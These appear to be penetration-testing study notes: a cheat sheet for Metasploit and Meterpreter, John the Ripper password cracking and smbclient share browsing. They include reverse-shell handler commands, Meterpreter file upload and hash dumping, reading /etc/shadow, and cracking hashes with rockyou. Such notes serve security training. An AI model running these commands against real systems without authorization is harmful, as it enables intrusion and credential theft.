

# Exploitation Frameworks

## Metasploit

### Quick Startup

To start Metasploit without the banner (Quick start)

```bash
sudo msfconsole -q
```

You can also supply parameters to MSF from the CLI to quickly populate options:

```bash
sudo msfconsole -x "use exploit/multi/handler; set RHOST 192.168.153.10; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.119.153; set LPORT 4444; exploit"
```

### Menu Basic Commands

```bash
# Help menu - shows various categories and options
show -h

# Activate a module & change prompt to show active module
use MODULE_PATH_NAME

# Exit out of the current context
previous

# Return to the main prompt
back

# Change default interface used for LHOST (doesn't work for me)
setg interface tun0
```

### Modules

#### Selecting Modules

From main prompt:

```bash
# Show all modules of a certain type (exploit, auxiliary, etc)
show TYPE

# Search for modules
search OPTIONS
# Options
-h		# Show help menu
type:	# Filter by module type (exploit, auxiliary, etc)
name:	# Filter by descriptive name
```

#### Module Commands

From a module sub-prompt:

```bash
# Show information about the loaded module
info

# Show module options
show options

# Set an option value for the current module
set OPTION_NAME OPTION_VALUE
# Remove an option value for the current module
unset OPTION_NAME

# Set an option globally across all modules
setg OPTION_NAME OPTION_VALUE
# Remove a global option value for all modules
unsetg OPTION_NAME

# When using an exploit, check if the target is vulnerable - requires target to show some banner or other data
check

# Run a module (after setting options)
# Modules can also be run in the background.  See the 'Job Management' section
run
	# OR
exploit

```

#### Exploit Multi Handler

Netcat can be used as a rudimentary way of catching reverse shells but does not work for more advanced payloads and is not really an elegant way to operate.  The multi handler works for all single and multi-stage payloads.

```bash
use multi/handler
set LHOST 192.168.119.216
set LPORT 8000
# You must tell the multi-handler what kind of payload to expect
set payload windows/meterpreter/reverse_https
# Run as a background job
run -j
```

This will create a listener in Metasploit to catch reverse shells.

### Payloads

Once an exploit module is loaded, you need to set a payload rather than use the default one.  After selection the payload, you will need to set options for it as well.  

Note:  Payloads with a slash in their name are staged payloads, but the ones without them are non-staged.  Ex. `shell_reverse_tcp` is non-staged, but `shell/reverse_tcp` is staged

The `show options` command contains an `Exploit target` section which may have additional options, and may require the `set target` command to match the environment you're exploiting.  Ex. You may need to specify a return address for a BoF attack.

```bash
# Show payloads compatible with the currently selected module
show payloads

# Select a payload
set payload PAYLOAD_PATH
```

#### Meterpreter

Meterpreter provides a user-friendly and convenient interface to easily perform complex commands.  You can also enter a regular system shell.

```bash
# Show a list all modules and commands for meterpreter
help

# Target System Info
sysinfo

# Current user
getuid

# Upload a file
# NOTE:  Escape backslashes by using a double-backslash 
upload /usr/share/windows-resources/binaries/nc.exe c:\\users\\offsec.client251

# Download a file
# NOTE:  Escape backslashes by using a double-backslash 
download c:\\windows\\system32\\calc.exe /tmp/calc.exe

# Remote Filesystem navigation
ls \ pwd \ cd

# Local Filesystem navigation
lls \ lpwd \ lcd

# Launch a command shell
shell
# You won't get a prompt, so just try to enter a command once it says the channel was created.
# If the shell gets hung, use CTRL+C to close the channel and return to meterpreter

# Launch an application
execute -f app.exe

# List all running processes
ps

# Terminate a process ID N
kill N
```

#### Meterpreter Extensions

Extension provide additional functionality to the meterpreter shell.  These can be loaded from within the meterpreter session:

##### Powershell

Allows you to run Powershell commands and scripts.

```bash
# Load the module
load powershell

# Execute a command
powershell_execute "COMMAND"

# Import a Powershell script
powershell_import SCRIPT

# Start a Powershell prompt
powershell_shell
```

#### Hash Dumping

```bash
run post/windows/gather/smart_hashdump
```

### Session Management

Once a remote session is established, it can be managed with the following.  These commands are performed from the module menu:

```bash
# Show all sessions
sessions -l

# Interact with session N
sessions -i N
```

These commands are performed from within the meterpreter session:

```bash
# Background the session
background
	#OR
CTRL+Z

# Kill the session
exit
	#OR
CTRL+C
```

# Password Attacks

## John the Ripper

When cracking passwords with John the Ripper, you need to supply it with three crucial pieces of information:

1. The format of the hashes
2. The file containing the hash(es)
3. The wordlist you are going to use

### Hashes

You need to tell John what type of password hashes you're giving it.  If you don't know, you can use hashid to attempt to verify it

```bash
hashid HASHFILE.TXT
```

Hashid will make a best guess on what type of hash it is, but it's far from perfect.  You should start at the top of the list and then work your way down, trying the most likely sources (MD5, SHA1, NT, etc) as you go down the list.

When specifying the hash format with John, you need to use specific keywords.  For instance, if the hash is an MD5 hash, it should be specified as `Raw-MD5`.  You can view the formats JTR supports (which may vary by Linux Distro) with `john --list=formats`.  If you just want to see the raw hash formats, use `john --list=formats | grep Raw`.

#### Windows Hashes

- Preparing the Hash file:

  - You do not need to prepend the hash with the Generic Windows LM hash, JTR is fairly forgiving.  NT format example:   

    ```powershell
    # This was obtained from gsecdump -s
    alice(current):1004:aad3b435b51404eeaad3b435b51404ee:b74242f37e47371aff835a6ebcac4ffe:::
    
    # You can also just do this:
    alice:b74242f37e47371aff835a6ebcac4ffe
    
    # Or you can just put the hash without a username
    b74242f37e47371aff835a6ebcac4ffe
    ```

- Cracking

  ```bash
  sudo john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hashfile.txt
  ```

#### Linux Passwords

Note:  Newer versions of Kali Linux use yescrypt, which is `format=crypt` in John and is not auto-detected, so you need to specify that.

- First use `unshadow` to combine the /etc/passwd and /etc/shadow files.

  ```bash
  # Extract the info from /etc/passwd and /etc/shadow to two separate files.  You can filter for specific users.
  grep victim /etc/passwd > passwd-file.txt
  sudo grep victim /etc/shadow > shadow-file.txt
  # Generate format for use with JTR
  unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
  ```

- Run JTR

  ```bash
  # John will autodetect regular Linux hashes (but not yescrypt hashes)
  john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
  ```

### WordList

If no wordlist is specified, John will perform a simple bruteforce attack.  This will probably take a long time because it has more guesses.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT

# Options
--wordlist=/usr/share/wordlists/rockyou.txt	# Specifies wordlist to use for password guesses
```

### Show Cracked Passwords

Cracked hashes are stored in `~/.john/john.pot` but you can view them with this command:

```bash
john hash.txt --show --format=NT

# Options
--show		# Tells John to show the status of the cracked passwords for the given hash file, including how many remain to be cracked.
```

# SMBClient

List shares on a client

```bash
smbclient -L 192.168.216.10 --port=445 --user=SomeUser

# Options
--user=user	# Specify user to connect as, also works with -U (if no user is specified, Anonymous access is attempted)
--port=445	# Specify port to connect on.  If no port is specified, 445 is assumed.
```

Browse a share

```bash
# Creates a connection
smbclient //SERVER/SHARENAME --user=SomeUser

# Listing directories recursively
recurse
ls
```

Downloading or Uploading Files from within a share connection

```bash
# Download files
get REMOTEFILE

# Upload files
put LOCALFILE

# Download a folder and its files
mget REMOTEDIR

# Upload a folder and its files
mput LOCALDIR
```

Check a file's attributes

```bash
allinfo FILE
```

Viewing a File

```bash
more FILE.txt
# Press `q` to exit from the viewer
```

